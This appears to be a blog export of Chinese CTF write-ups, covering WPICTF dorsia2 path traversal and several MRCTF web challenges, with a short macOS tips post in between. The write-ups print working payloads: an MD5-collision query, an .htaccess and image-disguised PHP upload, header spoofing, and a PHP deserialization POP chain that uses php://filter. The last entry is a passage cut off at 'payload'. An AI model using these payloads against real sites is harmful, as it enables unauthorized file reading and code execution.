<p><img src="/pic/149.png" alt=""></p>
<p>直接给出了flag， url填入<a href="http://storage.zoop/flag.txt即可" target="_blank" rel="noopener">http://storage.zoop/flag.txt即可</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">WPI&#123;tH4nKs_z00m3r_jh0n50n&#125;</span><br></pre></td></tr></table></figure>



<h2 id="dorsia2"><a href="#dorsia2" class="headerlink" title="dorsia2"></a>dorsia2</h2><p>题目描述如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;us-east-1.linodeobjects.com&#x2F;wpictf-challenge-files&#x2F;dorsia.webm The second card.</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;dorsia2.wpictf.xyz:31337&#x2F;index.html or 31338 or 31339</span><br><span class="line"></span><br><span class="line">Firefox doesnt like the page... try chromium.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Hint: flag in ~&#x2F;flag.txt</span><br></pre></td></tr></table></figure>

<p>在视频中第二张卡片的内容为</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">char</span> a[<span class="number">69</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"GET /%s"</span>, &amp;a);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"HTTP 200\r\n\r\n"</span>);</span><br><span class="line">fflush(<span class="built_in">stdout</span>); </span><br><span class="line">execlp(<span class="string">"cat"</span>,a,a,<span class="number">0</span>);&#125;</span><br></pre></td></tr></table></figure>

<p>使用chrome浏览器访问，提示文本为发送。</p>
<p>使用nc/burp suite获取flag.txt</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ncat dorsia2.wpictf.xyz 31337 </span><br><span class="line">GET /../flag.txt</span><br><span class="line">HTTP 200</span><br><span class="line"></span><br><span class="line">WPI&#123;1_H4VE_2_return_SOME_VIDE0TAP3S&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/../flag.txt</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: dorsia2.wpictf.xyz:31337</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>日常刷题</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>macos问题记录</title>
    <url>/2020/04/05/macos%E9%97%AE%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h2 id="0x00-无法使用手机usb共享网络给mac"><a href="#0x00-无法使用手机usb共享网络给mac" class="headerlink" title="0x00 无法使用手机usb共享网络给mac"></a>0x00 无法使用手机usb共享网络给mac</h2><p>去下载最新的HoRNDIS（截止目前最新是9.2版本）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;joshuawise.com&#x2F;horndis  &#x2F;&#x2F;HoRNDIS介绍地址</span><br><span class="line">http:&#x2F;&#x2F;joshuawise.com&#x2F;downloads&#x2F;HoRNDIS-9.2.pkg  &#x2F;&#x2F;下载地址</span><br></pre></td></tr></table></figure>

<h2 id="0x01-如何在命令行中的工作界面界面打开文件窗口-反过来"><a href="#0x01-如何在命令行中的工作界面界面打开文件窗口-反过来" class="headerlink" title="0x01 如何在命令行中的工作界面界面打开文件窗口/反过来"></a>0x01 如何在命令行中的工作界面界面打开文件窗口/反过来</h2><p>在命令行中打开当前文件夹窗口，直接使用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">open .</span><br></pre></td></tr></table></figure>

<p>在当前文件夹打开命令行接口，可以在系统偏好设置-键盘-快捷键-服务中进行设置<br><img src="/pic/upload_81c655dd2a316924e2605eb21c3244f4.png" alt=""><br>我设置的是control+option+command+T</p>
<h2 id="在未开启其他app时如何截图"><a href="#在未开启其他app时如何截图" class="headerlink" title="在未开启其他app时如何截图"></a>在未开启其他app时如何截图</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">control+Shift+command+4 &#x2F;&#x2F;选中截图保存在剪切板</span><br><span class="line">control+command+4  &#x2F;&#x2F;选中截图保存在桌面</span><br><span class="line"></span><br><span class="line">control+Shift+command+3 &#x2F;&#x2F;全屏截图保存在剪切板</span><br><span class="line">control+command+3  &#x2F;&#x2F;全屏截图保存在桌面</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>日常水文</category>
      </categories>
      <tags>
        <tag>问题记录</tag>
      </tags>
  </entry>
  <entry>
    <title>MRCTF-wp</title>
    <url>/2020/03/27/MRCTF/</url>
    <content><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="ez-bypass"><a href="#ez-bypass" class="headerlink" title="ez_bypass"></a>ez_bypass</h2><p>打开题目就有源码</p>
<a id="more"></a>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line">$flag=<span class="string">'MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;'</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'gg'</span>])&amp;&amp;<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>])) &#123;</span><br><span class="line">    $id=$_GET[<span class="string">'id'</span>];</span><br><span class="line">    $gg=$_GET[<span class="string">'gg'</span>];</span><br><span class="line">    <span class="keyword">if</span> (md5($id) === md5($gg) &amp;&amp; $id !== $gg) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'You got the first step'</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'passwd'</span>])) &#123;</span><br><span class="line">            $passwd=$_POST[<span class="string">'passwd'</span>];</span><br><span class="line">            <span class="keyword">if</span> (!is_numeric($passwd))</span><br><span class="line">            &#123;</span><br><span class="line">                 <span class="keyword">if</span>($passwd==<span class="number">1234567</span>)</span><br><span class="line">                 &#123;</span><br><span class="line">                     <span class="keyword">echo</span> <span class="string">'Good Job!'</span>;</span><br><span class="line">                     highlight_file(<span class="string">'flag.php'</span>);</span><br><span class="line">                     <span class="keyword">die</span>(<span class="string">'By Retr_0'</span>);</span><br><span class="line">                 &#125;</span><br><span class="line">                 <span class="keyword">else</span></span><br><span class="line">                 &#123;</span><br><span class="line">                     <span class="keyword">echo</span> <span class="string">"can you think twice??"</span>;</span><br><span class="line">                 &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'You can not get it !'</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'only one way to get the flag'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"You are not a real hacker!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Please input first'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;Please input first</span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;4d316f88-95dd-4d3f-ad11-e41a47f4d4a6.node3.buuoj.cn&#x2F;?id&#x3D;%CD%D1%2D%CB%2E%94%AE%DA%88%88%E7%24%13%47%D7%3D%5D%EC%36%5B%B7%15%2C%3A%18%9E%82%61%CC%C4%A5%40%E5%CB%AE%DA%7C%25%3E%6C%EB%41%BF%B3%D4%51%9D%47%A8%BC%D4%39%F7%77%86%CE%00%DB%AA%87%23%89%70%E6%4E%A9%00%91%90%46%10%25%17%56%0E%51%2F%1E%DE%51%A6%DF%43%2E%01%66%2E%2A%C9%1A%F6%46%EC%47%E2%EB%30%64%46%19%06%59%DB%FD%7A%88%70%AF%C3%3C%09%ED%54%08%96%F2%6F%29%F5%70%55%C6%7A%22%89%61%D3%85%96%89%B2%64%E5%3A%AD%95%DA%EA%7B%9D%17%7F%5B%E1%B9%23%2C%27%23%54%CF%82%42%16%39%8A%28%20%B0%27%6D%CB%1A%EB%42%8D%EA%F2%4B%DE%B7%1C%0A%80%F6%90%19%6A%C9%F9%DB%F6%CD%49%FC%BF%D7%CF%CA%E8%A0%FF%0C%40%89%BD%0F%FC%80%0E%E3%0E%D2%C4%CB%E2%95%E4%8B%B8%2B%B8%09%BE%7A%3D%FE%AC%F2%96%CC%3A%3D%BE%95%27%7F%F4%41%B1%19%A6%3A%A7%15%6A%9B%B4%7D%FE%E4%90%AE%88%74%C3%13%65%DE%D5%7B%F6%95%5C%28%8A&amp;gg&#x3D;%CD%D1%2D%CB%2E%94%AE%DA%88%88%E7%24%13%47%D7%3D%5D%EC%36%DB%B7%15%2C%3A%18%9E%82%61%CC%C4%A5%40%E5%CB%AE%DA%7C%25%3E%6C%EB%41%BF%B3%D4%D1%9D%47%A8%BC%D4%39%F7%77%86%CE%00%DB%AA%07%23%89%70%E6%4E%A9%00%91%90%46%10%25%17%56%0E%51%2F%1E%DE%51%A6%DF%43%AE%01%66%2E%2A%C9%1A%F6%46%EC%47%E2%EB%30%64%46%19%06%59%DB%FD%7A%88%70%AF%C3%BC%08%ED%54%08%96%F2%6F%29%F5%70%55%C6%7A%A2%89%61%D3%85%96%89%B2%64%E5%3A%AD%95%DA%EA%7B%9D%17%7F%5B%E1%B9%23%2C%A7%23%54%CF%82%42%16%39%8A%28%20%B0%27%6D%CB%1A%EB%42%8D%EA%F2%4B%DE%B7%1C%0A%00%F6%90%19%6A%C9%F9%DB%F6%CD%49%FC%BF%D7%4F%CA%E8%A0%FF%0C%40%89%BD%0F%FC%80%0E%E3%0E%D2%C4%CB%E2%95%E4%8B%B8%2B%38%09%BE%7A%3D%FE%AC%F2%96%CC%3A%3D%BE%95%27%7F%F4%41%B1%19%A6%3A%A7%15%6A%9B%34%7E%FE%E4%90%AE%88%74%C3%13%65%DE%D5%7B%76%95%5C%28%8A</span><br></pre></td></tr></table></figure>

<p><img src="/pic/144.png" alt=""></p>
<h2 id="你传你🐎呢"><a href="#你传你🐎呢" class="headerlink" title="你传你🐎呢"></a>你传你🐎呢</h2><p>文件上传</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/upload.php</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: d891b650-5a8b-4edc-89ca-303d041df9d1.merak-ctf.site</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span>: multipart/form-data; boundary=---------------------------400560856011615641723368312644</span><br><span class="line"><span class="attribute">Content-Length</span>: 458</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"></span><br><span class="line">-----------------------------400560856011615641723368312644</span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="uploaded"; filename=".htaccess"</span><br><span class="line"><span class="attribute">Content-Type</span>: image/jpeg</span><br><span class="line"></span><br><span class="line">#define height 12</span><br><span class="line">#define width 12</span><br><span class="line">AddType application/x-httpd-php .jpg</span><br><span class="line">php_value auto_append_file "1.jpg"</span><br><span class="line">-----------------------------400560856011615641723368312644</span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="submit"</span><br><span class="line"></span><br><span class="line">ä¸é®å»ä¸</span><br><span class="line">-----------------------------400560856011615641723368312644--</span><br></pre></td></tr></table></figure>

<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/upload.php</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: d891b650-5a8b-4edc-89ca-303d041df9d1.merak-ctf.site</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span>: multipart/form-data; boundary=---------------------------29705509393397799580693485075</span><br><span class="line"><span class="attribute">Content-Length</span>: 383</span><br><span class="line"><span class="attribute">Cookie</span>: PHPSESSID=d7c1fe298429b3461f3a252fc9625491</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"></span><br><span class="line">-----------------------------29705509393397799580693485075</span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="uploaded"; filename="../../1.jpg"</span><br><span class="line"><span class="attribute">Content-Type</span>: image/jpeg</span><br><span class="line"></span><br><span class="line"><span class="attribute">GIF89a</span></span><br><span class="line">&lt;?php echo file_get_contents("/flag")?&gt;</span><br><span class="line">-----------------------------29705509393397799580693485075</span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="submit"</span><br><span class="line"></span><br><span class="line">ä¸é®å»ä¸</span><br><span class="line">-----------------------------29705509393397799580693485075--</span><br></pre></td></tr></table></figure>

<p>访问url/upload/9af352e703653f2467a045cde806bd86/1.jpg</p>
<p>即可得到flag</p>
<h2 id="PYwebsite"><a href="#PYwebsite" class="headerlink" title="PYwebsite"></a>PYwebsite</h2><p>查看源码，发现有一段js验证</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">enc</span>(<span class="params">code</span>)</span>&#123;</span><br><span class="line">      hash = hex_md5(code);</span><br><span class="line">      <span class="keyword">return</span> hash;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">validate</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      <span class="keyword">var</span> code = <span class="built_in">document</span>.getElementById(<span class="string">"vcode"</span>).value;</span><br><span class="line">      <span class="keyword">if</span> (code != <span class="string">""</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(hex_md5(code) == <span class="string">"0cd4da0223c0b280829dc3ea458d655c"</span>)&#123;</span><br><span class="line">          alert(<span class="string">"您通过了验证！"</span>);</span><br><span class="line">          <span class="built_in">window</span>.location = <span class="string">"./flag.php"</span></span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">          alert(<span class="string">"你的授权码不正确！"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        alert(<span class="string">"请输入授权码"</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>

<p>跟随到flag.php，提示记录了IP</p>
<p><img src="/pic/145.png" alt=""></p>
<p>加一个xff</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/flag.php</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: node3.buuoj.cn:27983</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">X-Forwarded-For</span>: 127.0.0.1</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">Pragma</span>: no-cache</span><br><span class="line"><span class="attribute">Cache-Control</span>: no-cache</span><br></pre></td></tr></table></figure>



<h2 id="Ezpop"><a href="#Ezpop" class="headerlink" title="Ezpop"></a>Ezpop</h2><p>打开就是源码，序列化漏洞</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="comment">//WTF IS THIS?</span></span><br><span class="line"><span class="comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span></span><br><span class="line"><span class="comment">//And Crack It!</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  $var;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span><span class="params">($value)</span></span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;append(<span class="keyword">$this</span>-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file=<span class="string">'index.php'</span>)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = $file;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Welcome to '</span>.<span class="keyword">$this</span>-&gt;source.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">"/gopher|http|file|ftp|https|dict|\.\./i"</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"hacker"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">"index.php"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($key)</span></span>&#123;</span><br><span class="line">        $function = <span class="keyword">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'pop'</span>]))&#123;</span><br><span class="line">    @unserialize($_GET[<span class="string">'pop'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    $a=<span class="keyword">new</span> Show;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">__construct()<span class="comment">//当一个对象创建时被调用</span></span><br><span class="line">__destruct() <span class="comment">//当一个对象销毁时被调用</span></span><br><span class="line">__toString() <span class="comment">//当一个对象被当作一个字符串使用</span></span><br><span class="line">__sleep()<span class="comment">//在对象在被序列化之前运行</span></span><br><span class="line">__wakeup()<span class="comment">//将在反序列化之后立即被调用(通过序列化对象元素个数不符来绕过)</span></span><br><span class="line">__get()<span class="comment">//获得一个类的成员变量时调用</span></span><br><span class="line">__set()<span class="comment">//设置一个类的成员变量时调用</span></span><br><span class="line">__invoke()<span class="comment">//调用函数的方式调用一个对象时的回应方法</span></span><br><span class="line">__call()<span class="comment">//当调用一个对象中的不能用的方法的时候就会执行这个函数</span></span><br></pre></td></tr></table></figure>

<p>pop链  </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Show::__wakeup()-&gt;Show::__toString()-&gt;Test::__get()-&gt;Modifier::__invoke()-&gt;Modifier::append()</span><br><span class="line"></span><br><span class="line">preg_match()正则是匹配字符串，传入的是对象，会触发__toString()，$this-&gt;str-&gt;source  str是Test类，触发__get，属性p是Modifier类，触发__invoke()，include可以利用伪协议包含flag。php源码</span><br></pre></td></tr></table></figure>

<p>编写序列化脚本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Test&#123;</span><br><span class="line">    public $p;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;p &#x3D; new Modifier();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">class Modifier &#123;</span><br><span class="line">    protected  $var&#x3D;&quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Show&#123;</span><br><span class="line">    public $source;</span><br><span class="line">    public $str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$s&#x3D;new Show();</span><br><span class="line">$t&#x3D;new Test();</span><br><span class="line">$s-&gt;str&#x3D;$t;</span><br><span class="line">$s-&gt;source&#x3D;$s;</span><br><span class="line">echo urlencode(serialize($s));</span><br><span class="line">&#x2F;&#x2F;O%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3Br%3A1%3Bs%3A3%3A%22str%22%3BO%3A4%3A%22Test%22%3A1%3A%7Bs%3A1%3A%22p%22%3BO%3A8%3A%22Modifier%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00var%22%3Bs%3A57%3A%22php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3Dflag.php%22%3B%7D%7D%7D</span><br></pre></td></tr></table></figure>

<p>将得到的base64解码即可拿到flag</p>
<h2 id="套娃"><a href="#套娃" class="headerlink" title="套娃"></a>套娃</h2><p>打开题目查看源码</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">//1st</span></span><br><span class="line"><span class="comment">$query = $_SERVER['QUERY_STRING'];</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> if( substr_count($query, '_') !== 0 || substr_count($query, '%5f') != 0 )&#123;</span></span><br><span class="line"><span class="comment">    die('Y0u are So cutE!');</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment"> if($_GET['b_u_p_t'] !== '23333' &amp;&amp; preg_match('/^23333$/', $_GET['b_u_p_t']))&#123;</span></span><br><span class="line"><span class="comment">    echo "you are going to the next ~";</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">!--&gt;</span></span><br></pre></td></tr></table></figure>

<p>$_SERVER是不进行urldecode解析的，被ban了%5f,但是可以传%5F</p>
<p>第二个使用%0a（换行）结尾即可绕过  关于<a href="https://www.cnblogs.com/20175211lyz/p/12198258.html" target="_blank" rel="noopener">preg_match绕过</a></p>
<p>拿到secrettw.php，</p>
<p>查看源码是jencode/<em>aaencode</em>(颜文字),刚入ctf那会在南邮平台见过，直接在F12控制台执行即可</p>
<p>得到提示</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">post me Merak</span><br></pre></td></tr></table></figure>

<p>然后拿到源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?php </span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">'takeip.php'</span>;</span><br><span class="line">ini_set(<span class="string">'open_basedir'</span>,<span class="string">'.'</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'Merak'</span>]))&#123; </span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line">    <span class="keyword">die</span>(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">change</span><span class="params">($v)</span></span>&#123; </span><br><span class="line">    $v = base64_decode($v); </span><br><span class="line">    $re = <span class="string">''</span>; </span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($v);$i++)&#123; </span><br><span class="line">        $re .= chr ( ord ($v[$i]) + $i*<span class="number">2</span> ); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> $re; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Local access only!'</span>.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">$ip = getIp();</span><br><span class="line"><span class="keyword">if</span>($ip!=<span class="string">'127.0.0.1'</span>)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Sorry,you don't have permission!  Your ip is :"</span>.$ip;</span><br><span class="line"><span class="keyword">if</span>($ip === <span class="string">'127.0.0.1'</span> &amp;&amp; file_get_contents($_GET[<span class="string">'2333'</span>]) === <span class="string">'todat is a happy day'</span> )&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Your REQUEST is:"</span>.change($_GET[<span class="string">'file'</span>]);</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(change($_GET[<span class="string">'file'</span>])); &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>对于第一个if  使用client-ip绕过，第二个可以使用php://input绕过</p>
<p>对于chenge写一个解密函数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">change</span><span class="params">($v=<span class="string">"flag.php"</span>)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    $re = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($v);$i++)&#123;</span><br><span class="line">        $re .= chr ( ord ($v[$i]) - $i*<span class="number">2</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    var_dump(base64_encode($re));</span><br><span class="line">    <span class="keyword">return</span> $re;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">change();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<p>payload</p>
